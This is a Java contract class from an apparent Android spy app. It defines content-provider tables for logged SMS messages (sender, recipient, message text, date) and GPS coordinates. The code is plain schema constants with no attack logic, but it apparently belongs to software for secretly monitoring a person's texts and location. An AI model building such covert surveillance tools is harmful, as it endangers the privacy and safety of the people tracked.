package com.spyapp.android.provider;

import android.net.Uri;
import android.provider.BaseColumns;

public class SpyContracts {

    public static class Sms {

        public static final String TABLE_NAME = "sms";

        public static final Uri CONTENT_URI =
                Uri.withAppendedPath(SpyProvider.BASE_URI, TABLE_NAME);

        public static final String CONTENT_ITEM_TYPE =
                "vnd.android.cursor.item/vnd.com.spyapp.android.provider.sms";
        public static final String CONTENT_TYPE =
                "vnd.android.cursor.dir/vnd.com.spyapp.android.provider.sms";

        public static final String DEFAULT_SORT_ORDER = Columns.DATE + " DESC";

        public static class Columns implements BaseColumns {

            public static final String TYPE = "type";
            public static final String SENDER = "sender";
            public static final String RECIPIENT = "recipient";
            public static final String MESSAGE = "message";
            public static final String DATE = "date";

        }

    }

    public static class Gps {

        public static final String TABLE_NAME = "gps";

        public static final Uri CONTENT_URI =
                Uri.withAppendedPath(SpyProvider.BASE_URI, TABLE_NAME);

        public static final String CONTENT_ITEM_TYPE =
                "vnd.android.cursor.item/vnd.com.spyapp.android.provider.gps";
        public static final String CONTENT_TYPE =
                "vnd.android.cursor.dir/vnd.com.spyapp.android.provider.gps";

        public static final String DEFAULT_SORT_ORDER = Columns.DATE + " DESC";

        public static class Columns implements BaseColumns {

            public static final String LATITUDE = "latitude";
            public static final String LONGITUDE = "longitude";
            public static final String DATE = "date";

        }

    }

}